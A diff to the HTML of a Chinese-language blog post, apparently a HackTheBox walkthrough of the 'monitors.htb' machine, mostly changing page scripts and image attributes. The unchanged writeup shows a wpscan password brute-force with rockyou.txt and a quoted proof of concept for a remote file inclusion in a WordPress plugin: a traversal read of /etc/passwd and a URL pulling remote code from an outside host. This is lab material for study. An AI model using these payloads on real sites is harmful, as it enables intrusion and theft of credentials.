@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -228,7 +243,7 @@
             <h1 style="display: none">monitors.htb</h1>
             
             <div class="markdown-body">
-              <h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://i.imgur.com/yVwJy0r.png" srcset="/img/loading.gif" alt="monitors.htb"></p>
+              <h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://i.imgur.com/yVwJy0r.png" alt="monitors.htb"></p>
 <h2 id="wpscan扫描"><a href="#wpscan扫描" class="headerlink" title="wpscan扫描"></a>wpscan扫描</h2><p>curl monitors.htb &gt; index.html</p>
 <p>wpscan –url monitors.htb  –enumerate</p>
 <p>晚上11：40开始使用wpscan扫描，但是工具未更新</p>
@@ -238,9 +253,9 @@
 <h2 id="登陆框爆破"><a href="#登陆框爆破" class="headerlink" title="登陆框爆破"></a>登陆框爆破</h2><p>echo “10.10.10.238 monitors.htb” &gt; &#x2F;etc&#x2F;hosts<br>ping monitors.htb<br><a target="_blank" rel="noopener" href="http://monitors.htb/wp-login.php">http://monitors.htb/wp-login.php</a><br>wpscan –url <a target="_blank" rel="noopener" href="http://monitors.htb/wp-login.php">http://monitors.htb/wp-login.php</a> –passwords &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt –usernames admin</p>
 <h2 id="插件可能有漏洞"><a href="#插件可能有漏洞" class="headerlink" title="插件可能有漏洞"></a>插件可能有漏洞</h2><p>wpscan –url monitors.htb –enumerate p<br>下午五点7分开始扫描，</p>
 <p>扫出一个插件</p>
-<p><img src="https://i.imgur.com/eznEZ2Q.png" srcset="/img/loading.gif" alt="2"></p>
+<p><img src="https://i.imgur.com/eznEZ2Q.png" alt="2"></p>
 <h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">WordPress Plugin WP with Spritz <span class="hljs-number">1.0</span> - Remote File Inclusion<br><br>view-source:http:<span class="hljs-regexp">//m</span>onitors.htb<span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/wp-with-spritz/</span>wp.spritz.content.filter.php?url=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">//</span>etc/passwd<br></code></pre></div></td></tr></table></figure>
-<p><img src="https://i.imgur.com/fWRBWtO.png" srcset="/img/loading.gif" alt="1"></p>
+<p><img src="https://i.imgur.com/fWRBWtO.png" alt="1"></p>
 <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment"># Exploit Title: WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion</span><br><span class="hljs-comment"># Date: 2018-04-25</span><br><span class="hljs-comment"># Exploit Author: Wadeek</span><br><span class="hljs-comment"># Software Link: https://downloads.wordpress.org/plugin/wp-with-spritz.zip</span><br><span class="hljs-comment"># Software Version: 1.0</span><br><span class="hljs-comment"># Tested on: Apache2 with PHP 7 on Linux</span><br><span class="hljs-comment"># Category: webapps</span><br><br><br><span class="hljs-number">1</span>. Version Disclosure<br><br><span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/wp-with-spritz/</span>readme.txt<br><br><span class="hljs-number">2</span>. Source Code<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br><span class="hljs-variable">$content</span>=file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><br><span class="hljs-number">3</span>. Proof of Concept<br><br><span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/wp-with-spritz/</span>wp.spritz.content.filter.php?url=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">//</span>etc/passwd<br><span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/wp-with-spritz/</span>wp.spritz.content.filter.php?url=http(s):<span class="hljs-regexp">//</span>domain/exec   <br></code></pre></div></td></tr></table></figure>
 <h2 id="远程文件包含漏洞的源码"><a href="#远程文件包含漏洞的源码" class="headerlink" title="远程文件包含漏洞的源码"></a>远程文件包含漏洞的源码</h2><p>漏洞原理可以查看：<a target="_blank" rel="noopener" href="https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/">What is Remote File Inclusion (RFI)?</a></p>
 <p>通过这样的url即可查看：<code>view-source:http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=wp.spritz.content.filter.php</code></p>
@@ -391,10 +406,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
